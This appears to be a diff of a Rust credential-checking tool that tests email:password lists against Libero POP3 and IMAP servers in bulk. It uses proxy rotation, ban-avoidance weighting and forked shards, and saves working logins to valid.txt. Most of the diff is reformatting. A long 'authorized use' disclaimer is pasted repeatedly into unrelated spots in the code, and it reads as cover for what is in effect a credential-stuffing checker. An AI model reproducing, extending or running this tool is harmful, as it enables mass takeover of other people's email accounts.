@@ -23,15 +23,16 @@
 //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
 //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
 
-
 #![allow(clippy::too_many_arguments)]
 #![cfg_attr(all(feature = "io_uring", target_os = "linux"), feature(async_closure))]
 
 use clap::Parser;
 use jemallocator::Jemalloc;
+use memmap2::Mmap;
 use once_cell::sync::Lazy;
-use rand::seq::SliceRandom;
+use parking_lot::Mutex;
 use rand::rng;
+use rand::seq::SliceRandom;
 use socket2::{Domain, Protocol, Socket, Type};
 use std::fs::{File, OpenOptions};
 use std::io::{BufWriter, Write};
@@ -39,14 +40,12 @@ use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
 use std::sync::Arc;
-use parking_lot::Mutex;
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
 use tokio::sync::mpsc::{self, Receiver};
 use tokio::sync::Mutex as AsyncMutex;
 use tokio::task::JoinHandle;
 use tokio::time::interval;
-use memmap2::Mmap;
 use tracing_subscriber;
 
 mod proxyless;
@@ -121,9 +120,9 @@ fn maybe_fork(shards: usize) {
         for _ in 1..shards {
             unsafe {
                 match libc::fork() {
-                    0 => return,      // Child continues validator
-                    -1 => continue,  // Failure – ignore
-                    _ => (),         // Parent loops
+                    0 => return,    // Child continues validator
+                    -1 => continue, // Failure – ignore
+                    _ => (),        // Parent loops
                 }
             }
         }
@@ -150,11 +149,12 @@ fn next_source_ip() -> IpAddr {
 }
 
 // ---------------------------------------------------------------------------
-// ENH#5 – Pre‑warm SYN cache (half‑open)           
+// ENH#5 – Pre‑warm SYN cache (half‑open)
 #[cfg(target_os = "linux")]
 fn prewarm_syn_pool(proxy_addrs: &[String]) {
     use std::net::ToSocketAddrs;
-    for p in proxy_addrs.iter().take(64) { // limit to avoid SYN flood
+    for p in proxy_addrs.iter().take(64) {
+        // limit to avoid SYN flood
         if let Ok(mut addrs) = p.to_socket_addrs() {
             if let Some(addr) = addrs.next() {
                 let _ = Socket::new(Domain::for_address(addr), Type::STREAM, Some(Protocol::TCP))
@@ -231,7 +231,9 @@ impl ProxyPool {
         };
         // Kick off latency filter in background
         let pool_clone = pool.clone();
-        tokio::spawn(async move { pool_clone.filter_latency().await; });
+        tokio::spawn(async move {
+            pool_clone.filter_latency().await;
+        });
         pool
     }
 
@@ -242,7 +244,8 @@ impl ProxyPool {
             // Probe in parallel (timeout 250 ms)
             let futs = all.into_iter().map(|p| async move {
                 let start = Instant::now();
-                let _ = tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&p)).await;
+                let _ =
+                    tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&p)).await;
                 (p, start.elapsed())
             });
             for (p, dur) in futures::future::join_all(futs).await {
@@ -366,16 +369,16 @@ impl POP3Handler {
         }
         // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
         //Tool Description: Libero Email Credential Validator (LECV)
-//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
-//Key legitimate use cases include:
-//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
-//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
-//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
-//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
-//Important Notice:
-//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
-//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
-//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
+        //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
+        //Key legitimate use cases include:
+        //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
+        //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
+        //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
+        //Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
+        //Important Notice:
+        //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
+        //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
+        //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
         &buf[..3] == b"+OK"
     }
 }
@@ -462,14 +465,22 @@ fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) 
 
     let elapsed = start.elapsed().as_secs_f64();
     let remaining = total.saturating_sub(checked);
-    let cps = if elapsed > 0.0 { checked as f64 / elapsed } else { 0.0 };
+    let cps = if elapsed > 0.0 {
+        checked as f64 / elapsed
+    } else {
+        0.0
+    };
     let cpm = cps * 60.0;
     let progress = if total > 0 {
         (checked as f64 / total as f64) * 100.0
     } else {
         0.0
     };
-    let eta_secs = if cps > 0.0 { remaining as f64 / cps } else { 0.0 };
+    let eta_secs = if cps > 0.0 {
+        remaining as f64 / cps
+    } else {
+        0.0
+    };
     let eta = Duration::from_secs_f64(eta_secs);
     let valid_rate = if checked > 0 {
         (valid as f64 / checked as f64) * 100.0
@@ -489,11 +500,7 @@ fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) 
 
     let bar_width = 20usize;
     let filled = ((progress / 100.0) * bar_width as f64) as usize;
-    let bar = format!(
-        "[{}{}]",
-        "#".repeat(filled),
-        "-".repeat(bar_width - filled)
-    );
+    let bar = format!("[{}{}]", "#".repeat(filled), "-".repeat(bar_width - filled));
 
     println!(
         "tot:{} chk:{} ok:{} bad:{} err:{} ret:{} rem:{} cps:{:.1} cpm:{:.1} ok%:{:.1} bad%:{:.1} err%:{:.1} prog:{:.1}% {} eta:{:.1}s run:{:.1}s conc:{} prx:{}",
@@ -567,28 +574,35 @@ fn create_consumer(
                 if let Some(pm) = &proxyless {
                     for item in &matrix {
                         if let MatrixItem::Pop { host, port, .. } = item {
-                            if pm
-                                .pop3_login(
-                                    host,
-                                    *port,
-                                    &email,
-                                    &pwd,
-                                    Duration::from_secs_f64(cfg.timeout),
-                                )
-                                .await
-                            {
-                                ok = true;
-                                net_err = false;
-                                break;
+                            for _ in 0..pm.len() {
+                                if pm
+                                    .pop3_login(
+                                        host,
+                                        *port,
+                                        &email,
+                                        &pwd,
+                                        Duration::from_secs_f64(cfg.timeout),
+                                    )
+                                    .await
+                                {
+                                    ok = true;
+                                    net_err = false;
+                                    break;
+                                }
                             }
                             net_err = false;
+                            if ok {
+                                break;
+                            }
                         }
                     }
                 } else {
                     let proxy = proxies.next();
                     for item in &matrix {
                         match item {
-                            MatrixItem::Pop { host, port, ssl, .. } => {
+                            MatrixItem::Pop {
+                                host, port, ssl, ..
+                            } => {
                                 let h = POP3Handler::new(
                                     host.clone(),
                                     *port,
@@ -603,7 +617,12 @@ fn create_consumer(
                                 }
                                 net_err = false;
                             }
-                            MatrixItem::Imap { host, port, starttls, .. } => {
+                            MatrixItem::Imap {
+                                host,
+                                port,
+                                starttls,
+                                ..
+                            } => {
                                 let h = IMAPHandler::new(
                                     host.clone(),
                                     *port,
@@ -651,8 +670,16 @@ fn create_consumer(
 
 // MatrixItem struct preserved, unchanged
 enum MatrixItem {
-    Pop { host: String, port: u16, ssl: bool },
-    Imap { host: String, port: u16, starttls: bool },
+    Pop {
+        host: String,
+        port: u16,
+        ssl: bool,
+    },
+    Imap {
+        host: String,
+        port: u16,
+        starttls: bool,
+    },
 }
 
 // ---------------------------------------------------------------------------
@@ -687,21 +714,49 @@ impl Config {
         let (pop, imap) = resolve_hosts(domain);
         let mut v = Vec::with_capacity(4);
         if self.poponly {
-            v.push(MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true });
+            v.push(MatrixItem::Pop {
+                host: pop.to_string(),
+                port: self.pop3_ssl_port,
+                ssl: true,
+            });
             return v;
         }
         if self.full {
             v.extend([
-                MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true },
-                MatrixItem::Pop { host: pop.to_string(), port: self.pop3_plain_port, ssl: false },
-                MatrixItem::Imap { host: imap.to_string(), port: self.imap_ssl_port, starttls: false },
-                MatrixItem::Imap { host: imap.to_string(), port: self.imap_plain_port, starttls: true },
+                MatrixItem::Pop {
+                    host: pop.to_string(),
+                    port: self.pop3_ssl_port,
+                    ssl: true,
+                },
+                MatrixItem::Pop {
+                    host: pop.to_string(),
+                    port: self.pop3_plain_port,
+                    ssl: false,
+                },
+                MatrixItem::Imap {
+                    host: imap.to_string(),
+                    port: self.imap_ssl_port,
+                    starttls: false,
+                },
+                MatrixItem::Imap {
+                    host: imap.to_string(),
+                    port: self.imap_plain_port,
+                    starttls: true,
+                },
             ]);
             return v;
         }
         v.extend([
-            MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true },
-            MatrixItem::Imap { host: imap.to_string(), port: self.imap_ssl_port, starttls: false },
+            MatrixItem::Pop {
+                host: pop.to_string(),
+                port: self.pop3_ssl_port,
+                ssl: true,
+            },
+            MatrixItem::Imap {
+                host: imap.to_string(),
+                port: self.imap_ssl_port,
+                starttls: false,
+            },
         ]);
         v
     }
@@ -748,16 +803,16 @@ struct Cli {
     ban_weight: f32,
     /// Shards (fork processes)
     //Tool Description: Libero Email Credential Validator (LECV)
-//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
-//Key legitimate use cases include:
-//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
-//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
-//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
-//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
-//Important Notice:
-//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
-//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
-//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
+    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
+    //Key legitimate use cases include:
+    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
+    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
+    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
+    //Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
+    //Important Notice:
+    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
+    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
+    //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
     #[arg(long, default_value_t = 1)]
     shards: usize,
 }
@@ -786,12 +841,24 @@ fn merge_cfg(cli: Cli) -> Config {
         ban_weight: cli.ban_weight,
         _nic_queue_pin: false,
     };
-    if let Some(c) = cli.conc { cfg.concurrency = c; }
-    if let Some(t) = cli.timeout { cfg.timeout = t; }
-    if let Some(r) = cli.retries { cfg.max_retries = r; }
-    if cli.poponly { cfg.poponly = true; }
-    if cli.full { cfg.full = true; }
-    if let Some(rf) = cli.refresh { cfg.refresh = rf.max(0.016); }
+    if let Some(c) = cli.conc {
+        cfg.concurrency = c;
+    }
+    if let Some(t) = cli.timeout {
+        cfg.timeout = t;
+    }
+    if let Some(r) = cli.retries {
+        cfg.max_retries = r;
+    }
+    if cli.poponly {
+        cfg.poponly = true;
+    }
+    if cli.full {
+        cfg.full = true;
+    }
+    if let Some(rf) = cli.refresh {
+        cfg.refresh = rf.max(0.016);
+    }
     cfg
 }
 
@@ -809,12 +876,38 @@ fn merge_cfg(cli: Cli) -> Config {
 //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
 async fn run_validator(cfg: Arc<Config>) {
     let proxyless = if cfg.proxyless {
-        Some(Arc::new(proxyless::ProxylessManager::detect(
-            cfg.rps,
-            Duration::from_secs(cfg.quarantine),
-            cfg.latency_weight,
-            cfg.ban_weight,
-        ).await))
+        let mgr = Arc::new(
+            proxyless::ProxylessManager::detect(
+                cfg.rps,
+                Duration::from_secs(cfg.quarantine),
+                cfg.latency_weight,
+                cfg.ban_weight,
+            )
+            .await,
+        );
+
+        // background tasks: token refill & EWMA decay
+        {
+            let m = mgr.clone();
+            tokio::spawn(async move {
+                let mut t = interval(Duration::from_millis(100));
+                loop {
+                    t.tick().await;
+                    m.refill_tokens();
+                }
+            });
+        }
+        {
+            let m = mgr.clone();
+            tokio::spawn(async move {
+                let mut t = interval(Duration::from_secs(30));
+                loop {
+                    t.tick().await;
+                    m.ewma_decay();
+                }
+            });
+        }
+        Some(mgr)
     } else {
         None
     };
@@ -826,22 +919,33 @@ async fn run_validator(cfg: Arc<Config>) {
         p
     };
 
-
     let stats = Arc::new(Stats::new());
 
     // ENH#10 4× concurrency channel depth
     let (tx, rx) = mpsc::channel::<(String, String)>(cfg.concurrency * 4);
     let rx = Arc::new(AsyncMutex::new(rx));
 
-    let valid_f = Arc::new(Mutex::new(
-        BufWriter::new(OpenOptions::new().create(true).append(true).open("valid.txt").unwrap()),
-    ));
-    let invalid_f = Arc::new(Mutex::new(
-        BufWriter::new(OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap()),
-    ));
-    let error_f = Arc::new(Mutex::new(
-        BufWriter::new(OpenOptions::new().create(true).append(true).open("error.txt").unwrap()),
-    ));
+    let valid_f = Arc::new(Mutex::new(BufWriter::new(
+        OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("valid.txt")
+            .unwrap(),
+    )));
+    let invalid_f = Arc::new(Mutex::new(BufWriter::new(
+        OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("invalid.txt")
+            .unwrap(),
+    )));
+    let error_f = Arc::new(Mutex::new(BufWriter::new(
+        OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open("error.txt")
+            .unwrap(),
+    )));
 
     // Spawn consumers
     let mut jobs: Vec<JoinHandle<()>> = Vec::new();
@@ -865,9 +969,13 @@ async fn run_validator(cfg: Arc<Config>) {
             let file = File::open(&cfg.input_file).expect("Input file not found");
             let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
             for line in mmap.split(|&b| b == b'\n') {
-                if line.is_empty() { continue; }
+                if line.is_empty() {
+                    continue;
+                }
                 let ln = std::str::from_utf8(line).unwrap_or("").trim();
-                if !ln.contains(':') { continue; }
+                if !ln.contains(':') {
+                    continue;
+                }
                 let mut it = ln.splitn(2, ':');
                 let email = it.next().unwrap().to_string();
                 let pwd = it.next().unwrap_or("").to_string();
@@ -888,32 +996,34 @@ async fn run_validator(cfg: Arc<Config>) {
     }
 
     producer.await.ok();
-    for job in jobs { job.await.ok(); }
+    for job in jobs {
+        job.await.ok();
+    }
 }
 
 // ---------------------------------------------------------------------------
 #[tokio::main]
 async fn main() {
     tracing_subscriber::fmt::init();
-    enable_tcp_tw_reuse();   // ENH#1 global sysctl tweak
-    ebpf_filter::attach();   // ENH#22 optional eBPF
+    enable_tcp_tw_reuse(); // ENH#1 global sysctl tweak
+    ebpf_filter::attach(); // ENH#22 optional eBPF
 
     let cli = Cli::parse();
     let cfg = Arc::new(merge_cfg(cli));
-    maybe_fork(cfg.shards);  // ENH#2 sharding
+    maybe_fork(cfg.shards); // ENH#2 sharding
 
     // Unit test – preserved
     //Tool Description: Libero Email Credential Validator (LECV)
-//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
-//Key legitimate use cases include:
-//Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
-//End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
-//Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
-//Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
-//Important Notice:
-//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
-//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
-//Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
+    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
+    //Key legitimate use cases include:
+    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
+    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
+    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
+    //Breach Exposure Validation: In scenarios where credential dumps or breach datasets are discovered, LECV can be employed—under lawful authority—to validate which Libero credentials are still active. This aids in preparing exposure notifications, deactivating compromised accounts, or reporting incidents to relevant authorities. Use is restricted to environments with clear legal entitlement to act on the data.
+    //Important Notice:
+    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
+    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
+    //Libero Email Validator ("the Tool") checks login details for Libero email accounts for ex company employees. It tries POP3 and IMAP servers in quick succession and notes which addresses #work. It can use many network connections at once so big lists finish faster.
     if std::env::args().any(|a| a == "test") {
         let (p, i) = resolve_hosts("libero.it");
         assert_eq!(p, "popmail.libero.it");
